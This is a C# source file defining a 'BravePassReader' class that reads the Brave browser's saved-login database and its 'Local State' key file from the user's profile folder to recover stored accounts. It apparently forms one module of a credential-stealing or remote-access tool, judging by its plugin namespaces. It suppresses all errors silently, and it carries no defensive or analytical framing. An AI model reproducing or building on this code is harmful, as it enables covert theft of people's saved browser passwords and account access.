

using InvokedCommon.Models;
using System;
using System.Collections.Generic;
using System.IO;


namespace Plugin.Helper.Browsers
{
	public class BravePassReader : ChromiumBase
	{
		public override string ApplicationName => "Brave";

		public override IEnumerable<RecoveredAccount> ReadAccounts()
		{
			try
			{
				return (IEnumerable<RecoveredAccount>) this.ReadAccounts(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BraveSoftware\\Brave-Browser\\User Data\\Local State"));
			}
			catch (Exception ex)
			{
				return (IEnumerable<RecoveredAccount>) new List<RecoveredAccount>();
			}
		}
	}
}
